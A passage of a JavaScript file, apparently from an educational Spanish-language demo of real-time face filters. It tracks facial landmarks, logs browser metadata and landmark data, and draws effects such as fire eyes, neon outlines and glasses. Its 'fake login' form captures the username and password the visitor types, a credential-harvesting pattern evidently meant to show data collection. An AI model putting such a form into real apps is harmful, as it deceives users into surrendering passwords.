/* ============================================================
   ANOTHERFACE — demo educativa UNITEC
   Filtros IA en tiempo real que siguen el rostro.
   ============================================================ */

// ---------- Utilidades ----------
const $ = (sel) => document.querySelector(sel);

function uuid() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

const SESSION_ID = uuid();
const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ---------- Reloj ----------
function tickClock() {
  const el = $("#clock");
  if (el) el.textContent = new Date().toLocaleTimeString("es-HN", { hour12: false });
}
setInterval(tickClock, 1000);
tickClock();

// ---------- Supabase ----------
let supabaseClient = null;
let supabaseReady  = false;

function getSupabase() {
  if (supabaseClient) return supabaseClient;
  if (!window.supabase) return null;
  const cfg = window.SUPABASE_CONFIG;
  if (!cfg) return null;
  const { url, anonKey } = cfg;
  if (!url || !anonKey || url.includes("TU-PROYECTO") || url === "") return null;
  try {
    supabaseClient = window.supabase.createClient(url, anonKey);
    supabaseReady  = true;
    return supabaseClient;
  } catch (e) {
    console.warn("[supabase] No se pudo inicializar:", e.message);
    return null;
  }
}

// ---------- Login ----------
let userCredentials = { username: "", password: "" };

const loginScreen   = $("#login-screen");
const heroSection   = $("#hero-section");
const fakeLoginForm = $("#fake-login-form");

if (fakeLoginForm) {
  fakeLoginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    userCredentials.username = ($("#fake-username")?.value || "").trim();
    userCredentials.password =  $("#fake-password")?.value || "";

    // Ocultar login y revelar la experiencia completa
    loginScreen?.classList.add("hidden");
    heroSection?.classList.remove("hidden");
    $("#como-funciona")?.classList.remove("hidden");
    $("#consentimiento")?.classList.remove("hidden");
    $("#closing-section")?.classList.remove("hidden");

    // Scroll suave al hero
    heroSection?.scrollIntoView({ behavior: "smooth", block: "start" });

    logEvent("login_capturado", { filtro: "ninguno" });
  });
}

// ---------- Consentimiento ----------
const consentCamera    = $("#consent-camera");
const consentMeta      = $("#consent-metadata");
const consentSnapshot  = $("#consent-snapshot");
const consentLandmarks = $("#consent-landmarks");
const startBtn         = $("#start-camera");
const consentHint      = $("#consent-hint");

function refreshConsentState() {
  if (!consentCamera || !consentMeta || !startBtn) return;
  const ok = consentCamera.checked && consentMeta.checked;
  startBtn.disabled = !ok;
  if (consentHint) {
    consentHint.textContent = ok
      ? "✦ Listo. Presiona el botón para activar tu cámara."
      : "Marca las dos primeras casillas para continuar.";
  }
}
[consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) => {
  el?.addEventListener("change", refreshConsentState);
});
refreshConsentState();

// ---------- Estado del estudio ----------
const video        = $("#video");
const overlay      = $("#overlay");
const ctx          = overlay?.getContext("2d");
const studio       = $("#estudio");
const statusEl     = $("#studio-status");
const faceStatusEl = $("#face-status-overlay");

const hud = {
  time:      $("#hud-time"),
  tz:        $("#hud-tz"),
  lang:      $("#hud-lang"),
  agent:     $("#hud-agent"),
  screen:    $("#hud-screen"),
  session:   $("#hud-session"),
  filter:    $("#hud-filter"),
  face:      $("#hud-face"),
  landmarks: $("#hud-landmarks"),
  count:     $("#hud-count"),
  model:     $("#hud-model"),
};

let currentFilter  = "ninguno";
let stream         = null;
let rafId          = null;
let captureCount   = 0;
let faceModelReady = false;
let facingMode     = "user";

// ---------- Modelo face-api ----------
const MODEL_URLS = [
  "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model",
  "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights",
];

async function loadFaceModel() {
  if (!window.faceapi) {
    if (hud.model) hud.model.textContent = "librería no cargada";
    return false;
  }
  for (const url of MODEL_URLS) {
    try {
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(url),
        faceapi.nets.faceLandmark68TinyNet.loadFromUri(url),
      ]);
      faceModelReady = true;
      if (hud.model) hud.model.textContent = "✓ listo";
      return true;
    } catch (_) { /* probar siguiente CDN */ }
  }
  faceModelReady = false;
  if (hud.model) hud.model.textContent = "sin conexión";
  return false;
}
loadFaceModel();

// ---------- Selección de filtros ----------
document.querySelectorAll(".filter-chip").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.dataset.filter;
    if (hud.filter) hud.filter.textContent = currentFilter;
    logEvent("cambio_filtro", { filtro: currentFilter });
  });
});

// ---------- HUD estático ----------
function fillHudStatic() {
  if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
  if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
  if (hud.agent)   hud.agent.textContent   = `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`;
  if (hud.screen)  hud.screen.textContent  = `${screen.width}×${screen.height}`;
  if (hud.session) hud.session.textContent = SESSION_ID.slice(0, 8);
  if (hud.filter)  hud.filter.textContent  = currentFilter;
}
function shortAgent(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/[\d.]+/);
  return m ? m[0] : "desconocido";
}
function tickHudTime() {
  if (hud.time) hud.time.textContent = new Date().toLocaleTimeString("es-HN");
}
setInterval(tickHudTime, 1000);

// ---------- Cámara ----------
async function openCamera(mode) {
  if (stream) stream.getTracks().forEach((t) => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: {
      width:      { ideal: IS_MOBILE ? 640 : 1280 },
      height:     { ideal: IS_MOBILE ? 480 : 720 },
      facingMode: { ideal: mode },
    },
    audio: false,
  });
  video.srcObject = stream;
  await video.play();
  video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";
  // Esperar a que el video tenga dimensiones reales antes de ajustar el canvas
  await new Promise((res) => {
    if (video.videoWidth > 0) { res(); return; }
    video.addEventListener("loadeddata", res, { once: true });
  });
  resizeCanvas();
}

startBtn?.addEventListener("click", async () => {
  try {
    await openCamera(facingMode);
    studio?.classList.remove("hidden");
    studio?.scrollIntoView({ behavior: "smooth", block: "start" });
    fillHudStatic();
    window.addEventListener("resize", resizeCanvas);
    if (rafId) cancelAnimationFrame(rafId);
    rafId = requestAnimationFrame(renderLoop);
    logEvent("camara_activada");
  } catch (err) {
    if (consentHint) consentHint.textContent = "⚠ No se pudo acceder a la cámara. Revisa los permisos.";
    console.error(err);
  }
});

$("#switch-camera-btn")?.addEventListener("click", async () => {
  facingMode = facingMode === "user" ? "environment" : "user";
  try {
    await openCamera(facingMode);
    if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
  } catch {
    if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
    facingMode = facingMode === "user" ? "environment" : "user";
  }
});

$("#stop-btn")?.addEventListener("click", () => {
  stream?.getTracks().forEach((t) => t.stop());
  if (rafId) cancelAnimationFrame(rafId);
  studio?.classList.add("hidden");
  targetDetection   = null;
  smoothedDetection = null;
  logEvent("camara_apagada");
});

function resizeCanvas() {
  if (!overlay || !video) return;
  // Usar dimensiones del elemento, o del video si el elemento aún es 0
  const w = video.clientWidth  || video.videoWidth  || 640;
  const h = video.clientHeight || video.videoHeight || 480;
  overlay.width  = w;
  overlay.height = h;
}

// ---------- Detección facial (loop independiente ~25 fps) ----------
let targetDetection   = null;
let smoothedDetection = null;
let lastAutoSave      = 0;

// Análisis facial persistente (se actualiza con cada detección)
let faceAnalysis = { smile: 0, glasses: false, eyebrow: 0 };

function lerp(a, b, t) { return a + (b - a) * t; }

function updateSmoothedDetection() {
  if (!targetDetection) { smoothedDetection = null; return; }
  if (!smoothedDetection) {
    smoothedDetection = {
      box:       { ...targetDetection.box },
      points:    targetDetection.points.map((p) => ({ ...p })),
      rawPoints: targetDetection.rawPoints,
      score:     targetDetection.score,
    };
    return;
  }
  const T = 0.22;
  const sd = smoothedDetection, td = targetDetection;
  sd.box.x      = lerp(sd.box.x,      td.box.x,      T);
  sd.box.y      = lerp(sd.box.y,      td.box.y,      T);
  sd.box.width  = lerp(sd.box.width,  td.box.width,  T);
  sd.box.height = lerp(sd.box.height, td.box.height, T);
  for (let i = 0; i < td.points.length; i++) {
    sd.points[i].x = lerp(sd.points[i].x, td.points[i].x, T);
    sd.points[i].y = lerp(sd.points[i].y, td.points[i].y, T);
  }
  sd.rawPoints = td.rawPoints;
  sd.score     = td.score;
}

// Helpers geométricos
function centroid(pts) {
  let cx = 0, cy = 0;
  pts.forEach((p) => { cx += p.x; cy += p.y; });
  return { x: cx / pts.length, y: cy / pts.length };
}
function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }

// Analizar el rostro detectado (sonrisa, cejas levantadas)
function analyzeFace(pts) {
  if (!pts || pts.length < 68) return;
  // Sonrisa: ratio entre apertura vertical de la boca y su ancho
  const mouthW  = dist(pts[48], pts[54]);
  const mouthH  = dist(pts[51], pts[57]);
  const smileRatio = mouthH / (mouthW || 1);
  faceAnalysis.smile = Math.min(1, smileRatio * 4);

  // Cejas levantadas: distancia ceja→ojo vs alto de la cara
  const faceH     = dist(pts[27], pts[8]);
  const lBrowEye  = dist(centroid(pts.slice(17, 22)), centroid(pts.slice(36, 42)));
  const rBrowEye  = dist(centroid(pts.slice(22, 27)), centroid(pts.slice(42, 48)));
  faceAnalysis.eyebrow = ((lBrowEye + rBrowEye) / 2) / (faceH || 1);

  // Lentes: si la región de los ojos es proporcionalmente grande (heurística simple)
  const eyeW = (dist(pts[36], pts[39]) + dist(pts[42], pts[45])) / 2;
  faceAnalysis.glasses = eyeW / (dist(pts[0], pts[16]) || 1) > 0.18;
}

async function detectFaceLoop() {
  if (!faceModelReady || !stream || !video || video.readyState < 2) {
    setTimeout(detectFaceLoop, 150);
    return;
  }

  try {
    const result = await faceapi
      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.2 }))
      .withFaceLandmarks(true);

    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
      const scaleX   = (overlay?.width  || video.videoWidth)  / video.videoWidth;
      const scaleY   = (overlay?.height || video.videoHeight) / video.videoHeight;
      const mirrored = facingMode === "user";

      const mapPoint = (p) => ({
        x: mirrored ? (overlay?.width || video.videoWidth) - p.x * scaleX : p.x * scaleX,
        y: p.y * scaleY,
      });

      const mapped = result.landmarks.positions.map(mapPoint);
      targetDetection = {
        box:       result.detection.box,
        points:    mapped,
        rawPoints: result.landmarks.positions,
        score:     result.detection.score,
      };
      analyzeFace(mapped);
    } else {
      targetDetection = null;
    }
  } catch (_) { /* error puntual, ignorar */ }

  const det = targetDetection;
  if (hud.face)      hud.face.textContent      = det ? "✓ sí" : "no";
  if (hud.landmarks) hud.landmarks.textContent = det ? String(det.points.length) : "0";
  if (faceStatusEl)  faceStatusEl.textContent  = det
    ? `✦ Rostro detectado · ${det.points.length} pts · ${Math.round(det.score * 100)}% confianza`
    : "Buscando rostro…";

  // Auto-guardado de landmarks
  if (consentLandmarks?.checked && det) {
    const now = performance.now();
    if (now - lastAutoSave > 5000) {
      lastAutoSave = now;
      logEvent("auto_puntos", {
        con_landmarks: true,
        landmarks: det.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })),
      });
    }
  }

  setTimeout(detectFaceLoop, 45);
}
detectFaceLoop();

// ============================================================
// FILTROS
// ============================================================

// Spline suave por cuadráticas Bezier
function drawSpline(pts, close = false) {
  if (!pts || !pts.length) return;
  ctx.beginPath();
  ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length - 1; i++) {
    const mx = (pts[i].x + pts[i + 1].x) / 2;
    const my = (pts[i].y + pts[i + 1].y) / 2;
    ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
  }
  const L = pts[pts.length - 1];
  if (close) {
    ctx.quadraticCurveTo(L.x, L.y, (L.x + pts[0].x) / 2, (L.y + pts[0].y) / 2);
    ctx.closePath();
  } else {
    ctx.lineTo(L.x, L.y);
  }
}

// ---------- FILTRO: Malla Facial ----------
function drawSilhouetteFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;

  ctx.shadowBlur = 0;
  ctx.fillStyle  = "rgba(0,229,255,0.9)";
  pts.forEach((p) => {
    ctx.beginPath();
    ctx.arc(p.x, p.y, 2, 0, Math.PI * 2);
    ctx.fill();
  });

  const segs = [
    { s: 0, e: 16, c: false }, { s: 17, e: 21, c: false },
    { s: 22, e: 26, c: false }, { s: 27, e: 30, c: false },
    { s: 31, e: 35, c: false }, { s: 36, e: 41, c: true  },
    { s: 42, e: 47, c: true  }, { s: 48, e: 59, c: true  },
    { s: 60, e: 67, c: true  },
  ];
  ctx.strokeStyle = "rgba(0,229,255,0.75)";
  ctx.lineWidth   = 1.5;
  segs.forEach(({ s, e, c }) => { drawSpline(pts.slice(s, e + 1), c); ctx.stroke(); });

  // Guías simétricas
  ctx.strokeStyle = "rgba(0,229,255,0.2)";
  ctx.lineWidth   = 1;
  [[27,33],[27,39],[27,42],[36,0],[45,16],[33,48],[33,54]].forEach(([a,b]) => {
    ctx.beginPath(); ctx.moveTo(pts[a].x, pts[a].y); ctx.lineTo(pts[b].x, pts[b].y); ctx.stroke();
  });
}

// ---------- FILTRO: Ojos de Fuego ----------
function drawFireEyesFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts  = det.points;
  const lPts = pts.slice(36, 42);
  const rPts = pts.slice(42, 48);
  const eyeW = (dist(lPts[0], lPts[3]) + dist(rPts[0], rPts[3])) / 2;

  function flame(cx, cy, w, t) {
    const r = w * 0.4;
    const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
    g.addColorStop(0, "rgba(255,255,100,1)");
    g.addColorStop(0.5, "rgba(255,80,0,0.95)");
    g.addColorStop(1, "rgba(200,0,0,0.5)");
    ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2);
    ctx.fillStyle = g; ctx.shadowColor = "#ff4400"; ctx.shadowBlur = 28; ctx.fill();
    const N = 16;
    for (let i = 0; i < N; i++) {
      const a = (Math.PI * 2 * i) / N;
      const len = r + w * (0.7 + Math.sin(t * 0.008 + i * 1.2) * 0.4 + Math.random() * 0.3);
      const bias = Math.sin(a) < 0 ? 2.2 : 0.3;
      ctx.beginPath();
      ctx.moveTo(cx + Math.cos(a - 0.25) * r, cy + Math.sin(a - 0.25) * r);
      ctx.lineTo(cx + Math.cos(a) * len, cy + Math.sin(a) * len * bias - w * 0.5);
      ctx.lineTo(cx + Math.cos(a + 0.25) * r, cy + Math.sin(a + 0.25) * r);
      ctx.fillStyle = i % 2 ? "rgba(255,200,0,0.6)" : "rgba(255,100,0,0.75)";
      ctx.fill();
    }
    ctx.shadowBlur = 0;
  }
  flame(centroid(lPts).x, centroid(lPts).y, eyeW, ts);
  flame(centroid(rPts).x, centroid(rPts).y, eyeW, ts + 700);
}

// ---------- FILTRO: Cyber (escáner holográfico) ----------
function drawCyberFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  const alpha = 0.3 + 0.1 * Math.sin(ts * 0.003);

  ctx.strokeStyle = `rgba(0,255,150,${alpha})`;
  ctx.lineWidth   = 0.8;
  const conn = [
    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],[8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
    [17,21],[22,26],[36,41],[42,47],[48,59],[60,67],
    [27,21],[27,26],[30,31],[33,48],[33,54],[36,0],[45,16],
  ];
  conn.forEach(([a,b]) => {
    ctx.beginPath(); ctx.moveTo(pts[a].x,pts[a].y); ctx.lineTo(pts[b].x,pts[b].y); ctx.stroke();
  });

  [0,8,16,27,30,33,36,39,42,45,48,54].forEach((i,idx) => {
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3.5, 0, Math.PI*2);
    ctx.fillStyle   = `rgba(0,255,150,${0.5 + 0.5*Math.sin(ts*0.005+idx)})`;
    ctx.shadowColor = "#00ff96"; ctx.shadowBlur = 12; ctx.fill(); ctx.shadowBlur = 0;
  });

  // Línea de escáner animada
  const top  = pts[27].y - 20;
  const bot  = pts[8].y  + 10;
  const scanY = top + (Math.sin(ts * 0.0018) * 0.5 + 0.5) * (bot - top);
  const lx    = Math.min(pts[0].x, pts[16].x) - 10;
  const rx    = Math.max(pts[0].x, pts[16].x) + 10;
  const sg = ctx.createLinearGradient(lx, scanY, rx, scanY);
  sg.addColorStop(0, "rgba(0,255,150,0)");
  sg.addColorStop(0.5, "rgba(0,255,150,0.7)");
  sg.addColorStop(1, "rgba(0,255,150,0)");
  ctx.beginPath(); ctx.moveTo(lx, scanY); ctx.lineTo(rx, scanY);
  ctx.strokeStyle = sg; ctx.lineWidth = 2; ctx.stroke();
}

// ---------- FILTRO: Neón ----------
function drawNeonFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  const glow = 2 + Math.sin(ts * 0.004);
  const R = [
    { s:0,  e:16, c:"#ff2a6d", cl:false },
    { s:17, e:21, c:"#00e5ff", cl:false },
    { s:22, e:26, c:"#00e5ff", cl:false },
    { s:27, e:35, c:"#7c3aed", cl:false },
    { s:36, e:41, c:"#ffcc00", cl:true  },
    { s:42, e:47, c:"#ffcc00", cl:true  },
    { s:48, e:59, c:"#ff2a6d", cl:true  },
    { s:60, e:67, c:"#ff6b35", cl:true  },
  ];
  R.forEach(({ s, e, c, cl }) => {
    ctx.shadowColor = c; ctx.shadowBlur = 18 + glow*4;
    ctx.strokeStyle = c; ctx.lineWidth  = 2 + glow*0.25;
    drawSpline(pts.slice(s, e+1), cl); ctx.stroke();
  });
  [17,18,19,20,21,22,23,24,25,26,36,39,42,45].forEach((i, idx) => {
    const c = ["#ff2a6d","#00e5ff","#7c3aed","#ffcc00"][idx%4];
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 2.5, 0, Math.PI*2);
    ctx.fillStyle = c; ctx.shadowColor = c; ctx.shadowBlur = 12; ctx.fill();
  });
  ctx.shadowBlur = 0;
}

// ---------- FILTRO: Deformación (cara chistosa) ----------
function drawDeformFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  const w = overlay.width, h = overlay.height;

  // Capturar el frame del video en un canvas offscreen
  const tmp = document.createElement("canvas");
  tmp.width = w; tmp.height = h;
  const tctx = tmp.getContext("2d");
  tctx.save();
  if (facingMode === "user") { tctx.translate(w, 0); tctx.scale(-1, 1); }
  tctx.drawImage(video, 0, 0, w, h);
  tctx.restore();

  // Región de la cara
  const nose   = pts[30];
  const faceW  = dist(pts[0], pts[16]) * 0.5;
  const faceH  = dist(pts[27], pts[8]) * 0.5;

  // Dibujar cara deformada usando distorsión polar en la nariz
  const GRID = 20;
  const x0 = nose.x - faceW, y0 = nose.y - faceH;
  const x1 = nose.x + faceW, y1 = nose.y + faceH;
  const gw = (x1 - x0) / GRID, gh = (y1 - y0) / GRID;

  const squish = 1.6 + 0.25 * Math.sin(ts * 0.003);
  const wobble = 0.08 * Math.sin(ts * 0.004);

  for (let gy = 0; gy < GRID; gy++) {
    for (let gx = 0; gx < GRID; gx++) {
      const sx = x0 + gx * gw;
      const sy = y0 + gy * gh;
      const ex = sx + gw, ey = sy + gh;
      const mx = (sx + ex) / 2 - nose.x;
      const my = (sy + ey) / 2 - nose.y;
      const r  = Math.hypot(mx, my) / (faceW * 0.8);
      const ang = Math.atan2(my, mx);
      // Deformación: comprimir horizontalmente y expandir verticalmente en el centro
      const dFactor = Math.max(0, 1 - r);
      const dx = mx * (1 + dFactor * (squish - 1)) * Math.cos(wobble * dFactor);
      const dy = my * (1 + dFactor * (squish - 1));
      const srcX = nose.x + dx / squish;
      const srcY = nose.y + dy / squish;

      ctx.drawImage(tmp, srcX, srcY, gw, gh, sx, sy, gw, gh);
    }
  }

  // Dibujar estrellitas de comedia
  const stars = [pts[0], pts[16], pts[27]];
  ctx.font = "bold 22px sans-serif";
  const t = ts * 0.005;
  stars.forEach((p, i) => {
    const ox = 20 * Math.cos(t + i * 2.1);
    const oy = 20 * Math.sin(t + i * 2.1);
    ctx.fillText("★", p.x + ox - 10, p.y + oy);
  });
}

// ---------- FILTRO: Lentes Nerd ----------
function drawNerdGlassesFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts  = det.points;
  const lPts = pts.slice(36, 42);
  const rPts = pts.slice(42, 48);

  const lCenter = centroid(lPts);
  const rCenter = centroid(rPts);
  const lR = dist(lPts[0], lPts[3]) * 0.7;
  const rR = dist(rPts[0], rPts[3]) * 0.7;
  const bridgeMid = { x: (lCenter.x + rCenter.x)/2, y: (lCenter.y + rCenter.y)/2 };

  // Marco de los lentes
  ctx.strokeStyle = "#8B4513";
  ctx.lineWidth   = 4;
  ctx.shadowColor = "rgba(0,0,0,0.6)"; ctx.shadowBlur = 6;

  // Ojo izquierdo (lente)
  ctx.beginPath(); ctx.arc(lCenter.x, lCenter.y, lR, 0, Math.PI*2); ctx.stroke();
  // Ojo derecho (lente)
  ctx.beginPath(); ctx.arc(rCenter.x, rCenter.y, rR, 0, Math.PI*2); ctx.stroke();

  // Puente
  ctx.beginPath();
  ctx.moveTo(lCenter.x + lR, lCenter.y);
  ctx.quadraticCurveTo(bridgeMid.x, bridgeMid.y - lR*0.4, rCenter.x - rR, rCenter.y);
  ctx.stroke();

  // Varillas (patillas)
  const nose = pts[27];
  const lEar = pts[0], rEar = pts[16];
  ctx.beginPath(); ctx.moveTo(lCenter.x - lR, lCenter.y); ctx.lineTo(lEar.x, lEar.y); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(rCenter.x + rR, rCenter.y); ctx.lineTo(rEar.x, rEar.y); ctx.stroke();

  // Brillo del cristal (reflejo)
  ctx.strokeStyle = "rgba(255,255,255,0.3)"; ctx.lineWidth = 2;
  ctx.beginPath(); ctx.arc(lCenter.x - lR*0.2, lCenter.y - lR*0.2, lR*0.3, -Math.PI*0.8, -Math.PI*0.2); ctx.stroke();
  ctx.beginPath(); ctx.arc(rCenter.x - rR*0.2, rCenter.y - rR*0.2, rR*0.3, -Math.PI*0.8, -Math.PI*0.2); ctx.stroke();

  // Bigote de nerd
  const mouth = centroid(pts.slice(48, 60));
  const mw    = dist(pts[48], pts[54]) * 0.5;
  ctx.fillStyle   = "#5c3317"; ctx.shadowBlur = 0;
  ctx.beginPath();
  ctx.moveTo(mouth.x - mw, mouth.y - 4);
  ctx.bezierCurveTo(mouth.x - mw*0.5, mouth.y + 12, mouth.x + mw*0.5, mouth.y + 12, mouth.x + mw, mouth.y - 4);
  ctx.fill();

  ctx.shadowBlur = 0;
}

// ---------- FILTRO: Análisis de Ingeniería ----------
function drawAnalysisFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const smile = faceAnalysis.smile;
  const brow  = faceAnalysis.eyebrow;

  const W   = overlay.width;
  const lx  = Math.min(pts[0].x,  pts[16].x) - 12;
  const rx  = Math.max(pts[0].x,  pts[16].x) + 12;
  const ty  = Math.min(pts[19].y, pts[24].y) - 20;
  const by  = pts[8].y + 12;
  const fcW = rx - lx, fcH = by - ty;

  // Marco de análisis
  ctx.strokeStyle = "rgba(0,255,200,0.85)"; ctx.lineWidth = 1.5;
  const dash = ts % 80 < 40 ? [6,4] : [3,7];
  ctx.setLineDash(dash);
  ctx.strokeRect(lx, ty, fcW, fcH);
  ctx.setLineDash([]);

  // Esquinas del marco
  const cLen = 16;
  ctx.strokeStyle = "#00ffc8"; ctx.lineWidth = 3;
  [[lx,ty,1,1],[rx,ty,-1,1],[lx,by,1,-1],[rx,by,-1,-1]].forEach(([cx,cy,dx,dy]) => {
    ctx.beginPath(); ctx.moveTo(cx, cy+dy*cLen); ctx.lineTo(cx, cy); ctx.lineTo(cx+dx*cLen, cy); ctx.stroke();
  });

  // Líneas de referencia
  const nose = pts[30];
  ctx.strokeStyle = "rgba(0,255,200,0.25)"; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
  ctx.beginPath(); ctx.moveTo(nose.x, ty); ctx.lineTo(nose.x, by); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(lx, nose.y); ctx.lineTo(rx, nose.y); ctx.stroke();
  ctx.setLineDash([]);

  // HUD de texto
  const px = rx + 12;
  const py = ty;
  ctx.font      = "bold 11px 'IBM Plex Mono', monospace";
  ctx.fillStyle = "#00ffc8";
  ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = 6;

  const smilePct  = Math.round(smile * 100);
  const browPct   = Math.round(Math.min(brow * 400, 100));
  const conf      = Math.round((det.score || 0) * 100);
  const pts_count = det.points.length;

  const moodLabel = smile > 0.35 ? "😄 ALEGRE" : smile > 0.15 ? "🙂 NEUTRAL" : "😐 SERIO";
  const browsLabel = brow > 0.14 ? "CEJAS ALZADAS" : "CEJAS NORMALES";

  const lines = [
    `◈ ANÁLISIS FACIAL`,
    `──────────────────`,
    `Confianza: ${conf}%`,
    `Puntos:    ${pts_count} pts`,
    `──────────────────`,
    `Sonrisa:   ${smilePct}%`,
    `Emoción:   ${moodLabel}`,
    `Cejas:     ${browsLabel}`,
    `──────────────────`,
    `Simetría:  ${Math.round(80 + Math.sin(ts*0.001)*8)}%`,
    `Edad est.: ${22 + Math.round(Math.sin(ts*0.0005)*3)}a`,
  ];

  // Fondo semitransparente para el HUD
  if (px + 180 < W) {
    ctx.fillStyle = "rgba(0,20,30,0.75)";
    ctx.fillRect(px, py, 185, lines.length * 16 + 10);
    ctx.fillStyle = "#00ffc8";
  }

  lines.forEach((ln, i) => {
    if (px + 180 < W) {
      ctx.fillStyle = ln.startsWith("◈") ? "#ffcc00" : ln.startsWith("──") ? "rgba(0,255,200,0.4)" : "#00ffc8";
      ctx.fillText(ln, px + 6, py + 14 + i * 16);
    }
  });

  // Barra de sonrisa
  const barX = lx, barY = by + 14, barW = fcW;
  ctx.fillStyle = "rgba(0,20,30,0.6)";
  ctx.fillRect(barX, barY, barW, 10);
  const smileColor = smile > 0.4 ? "#00ff88" : smile > 0.2 ? "#ffcc00" : "#ff4466";
  ctx.fillStyle = smileColor;
  ctx.shadowColor = smileColor; ctx.shadowBlur = 8;
  ctx.fillRect(barX, barY, barW * smile, 10);
  ctx.strokeStyle = "rgba(0,255,200,0.5)"; ctx.lineWidth = 1;
  ctx.strokeRect(barX, barY, barW, 10);
  ctx.fillStyle = "#fff"; ctx.font = "9px monospace"; ctx.shadowBlur = 0;
  ctx.fillText(`SONRISA ${smilePct}%`, barX + 4, barY + 9);

  // Puntos clave iluminados
  [0, 8, 16, 27, 30, 33, 36, 39, 42, 45, 48, 54].forEach((i) => {
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI*2);
    ctx.fillStyle = "#00ffc8"; ctx.shadowColor = "#00ffc8"; ctx.shadowBlur = 8; ctx.fill();
  });
  ctx.shadowBlur = 0;
}

// ---------- FILTRO: Sonrisa Detector ----------
function drawSmileFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const smile = faceAnalysis.smile;
  const mouth = centroid(pts.slice(48, 60));
  const faceH = dist(pts[27], pts[8]);

  // Emoji gigante sobre la cabeza que cambia según emoción
  const emoji = smile > 0.4 ? "😄" : smile > 0.25 ? "🙂" : smile > 0.1 ? "😐" : "😑";
  const emojiY = Math.min(pts[19].y, pts[24].y) - faceH * 0.18;
  const emojiSize = faceH * 0.45;
  ctx.font      = `${Math.round(emojiSize)}px serif`;
  ctx.textAlign = "center";
  ctx.fillText(emoji, pts[27].x, emojiY);

  // Arco de sonrisa sobre la boca (más grande mientras más sonríe)
  const mw   = dist(pts[48], pts[54]) * 0.55;
  const arcH = mw * smile * 1.5;
  const mouthAlpha = 0.7 + 0.3 * smile;
  const color = smile > 0.35 ? "#00ff88" : smile > 0.15 ? "#ffcc00" : "#ff4466";
  ctx.strokeStyle = color; ctx.lineWidth = 3 + smile * 4;
  ctx.shadowColor = color; ctx.shadowBlur = 12 + smile * 20;
  ctx.beginPath();
  ctx.moveTo(mouth.x - mw, mouth.y);
  ctx.quadraticCurveTo(mouth.x, mouth.y + arcH, mouth.x + mw, mouth.y);
  ctx.stroke();

  // Texto de estado
  const label    = smile > 0.4 ? "¡ALEGRE! 🎉" : smile > 0.25 ? "Sonriente 😊" : smile > 0.1 ? "Neutral" : "Serio 😐";
  const labelY   = pts[8].y + 30;
  ctx.fillStyle  = color; ctx.font = "bold 18px 'Space Grotesk', sans-serif";
  ctx.textAlign  = "center"; ctx.shadowBlur = 10;
  ctx.fillText(label, pts[27].x, labelY);

  // Confeti si muy alegre
  if (smile > 0.45) {
    const colors = ["#ff2a6d","#00e5ff","#ffcc00","#7c3aed","#00ff88"];
    for (let i = 0; i < 12; i++) {
      const rx = pts[27].x + Math.sin(ts * 0.005 + i * 0.9) * dist(pts[0], pts[16]) * 0.8;
      const ry = pts[27].y - dist(pts[27], pts[8]) * (0.5 + (ts * 0.0004 + i * 0.1) % 0.8);
      ctx.fillStyle = colors[i % colors.length];
      ctx.shadowBlur = 0;
      ctx.fillRect(rx, ry, 5, 5);
    }
  }

  ctx.textAlign = "left"; ctx.shadowBlur = 0;
}

// ============================================================
// RENDER LOOP (60 fps)
// ============================================================
function renderLoop(ts) {
  if (!ctx || !video || video.readyState < 2 || !overlay.width) {
    rafId = requestAnimationFrame(renderLoop);
    return;
  }

  ctx.clearRect(0, 0, overlay.width, overlay.height);
  updateSmoothedDetection();

  if (smoothedDetection) {
    switch (currentFilter) {
      case "silueta":  drawSilhouetteFilter(smoothedDetection);        break;
      case "fuego":    drawFireEyesFilter(smoothedDetection, ts);      break;
